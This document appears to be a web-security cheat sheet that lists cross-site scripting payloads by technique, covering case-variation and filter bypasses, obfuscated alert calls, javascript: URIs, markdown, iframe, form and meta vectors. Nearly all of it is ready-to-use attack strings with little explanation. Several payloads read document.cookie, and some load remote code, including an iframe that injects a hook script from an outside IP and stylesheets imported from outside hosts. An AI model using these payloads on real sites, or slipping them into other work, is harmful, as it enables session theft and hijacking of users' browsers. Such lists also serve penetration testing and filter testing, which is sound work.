Payload
================================

Commonly used
---------------------------------------------------

- ``<script>alert(/xss/)</script>``
- ``<svg onload=alert(document.domain)>``
- ``<img src=document.domain onerror=alert(document.domain)>``
- ``<M onmouseover=alert(document.domain)>M``
- ``<marquee onscroll=alert(document.domain)>``
- ``<a href=javascript:alert(document.domain)>M</a>``
- ``<body onload=alert(document.domain)>``
- ``<details open ontoggle=alert(document.domain)>``
- ``<embed src=javascript:alert(document.domain)>``

Case bypass
---------------------------------------------------

- ``<script>alert(1)</script>``
- ``<sCrIpT>alert(1)</sCrIpT>``
- ``<ScRiPt>alert(1)</ScRiPt>``
- ``<sCrIpT>alert(1)</ScRiPt>``
- ``<ScRiPt>alert(1)</sCrIpT>``
- ``<img src=1 onerror=alert(1)>``
- ``<iMg src=1 oNeRrOr=alert(1)>``
- ``<ImG src=1 OnErRoR=alert(1)>``
- ``<img src=1 onerror="alert("M")">``

- ``<marquee onscroll=alert(1)>``
- ``<mArQuEe OnScRoLl=alert(1)>``
- ``<MaRqUeE oNsCrOlL=alert(1)>``

Various alerts
---------------------------------------------------

- ``<script>alert(1)</script>``
- ``<script>confirm(1)</script>``
- ``<script>prompt(1)</script>``
- ``<script>alert('1')</script>``
- ``<script>alert("1")</script>``
- ``<script>alert`1`</script>``
- ``<script>(alert)(1)</script>``
- ``<script>a=alert,a(1)</script>``
- ``<script>[1].find(alert)</script>``
- ``<script>top["al"+"ert"](1)</script>``
- ``<script>top["a"+"l"+"e"+"r"+"t"](1)</script>``
- ``<script>top[/al/.source+/ert/.source](1)</script>``
- ``<script>top[/a/.source+/l/.source+/e/.source+/r/.source+/t/.source](1)</script>``

Pseudo-Protocol
---------------------------------------------------

- ``<a href=javascript:/0/,alert(%22M%22)>M</a>``
- ``<a href=javascript:/00/,alert(%22M%22)>M</a>``
- ``<a href=javascript:/000/,alert(%22M%22)>M</a>``
- ``<a href=javascript:/M/,alert(%22M%22)>M</a>``


Chrome XSS auditor bypass
---------------------------------------------------

- ``?param=https://&param=@z.exeye.io/import%20rel=import%3E``
- ``<base href=javascript:/M/><a href=,alert(1)>M</a>``
- ``<base href=javascript:/M/><iframe src=,alert(1)></iframe>``

Length limit
---------------------------------------------------

::

<script>s+="l"</script>
\...
<script>eval(s)</script>

jquery sourceMappingURL
---------------------------------------------------
``</textarea><script>var a=1//@ sourceMappingURL=//xss.site</script>``

Image name
---------------------------------------------------
``"><img src=x onerror=alert(document.cookie)>.gif``

Expired payload
---------------------------------------------------
- src=javascript:alert is basically not available
- CSS Expression feature is only available in older versions

css
---------------------------------------------------

::

<div style="background-image:url(javascript:alert(/xss/))">
<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>


markdown
---------------------------------------------------

::

[a](javascript:prompt(document.cookie))
[a](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))
<”
![a'"`onerror=prompt(document.cookie)](x)
[notmalicious](javascript:window.onerror=alert;throw%20document.cookie)
[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=)
![a](data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=)


iframe
---------------------------------------------------

::

<iframe onload='
var sc   = document.createElement("scr" + "ipt");
sc.type  = "text/javascr" + "ipt";
sc.src   = "http://1.2.3.4/js/hook.js";
document.body.appendChild(sc);
'
/>

- ``<iframe src=javascript:alert(1)></iframe>``
- ``<iframe src="data:text/html,<iframe src=javascript:alert('M')></iframe>"></iframe>``
- ``<iframe src=data:text/html;base64,PGlmcmFtZSBzcmM9amF2YXNjcmlwdDphbGVydCgiTWFubml4Iik+PC9pZnJhbWU+></iframe>``
- ``<iframe srcdoc=<svg/onload&equals;alert&lpar;1)>></iframe>``
- ``<iframe src=https://baidu.com width=1366 height=768></iframe>``
- ``<iframe src=javascript:alert(1) width=1366 height=768></iframe``

form
---------------------------------------------------

- ``<form action=javascript:alert(1)><input type=submit>``
- ``<form><button formaction=javascript:alert(1)>M``
- ``<form><input formaction=javascript:alert(1) type=submit value=M>``
- ``<form><input formaction=javascript:alert(1) type=image value=M>``
- ``<form><input formaction=javascript:alert(1) type=image src=1>``

meta
---------------------------------------------------

``<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">``

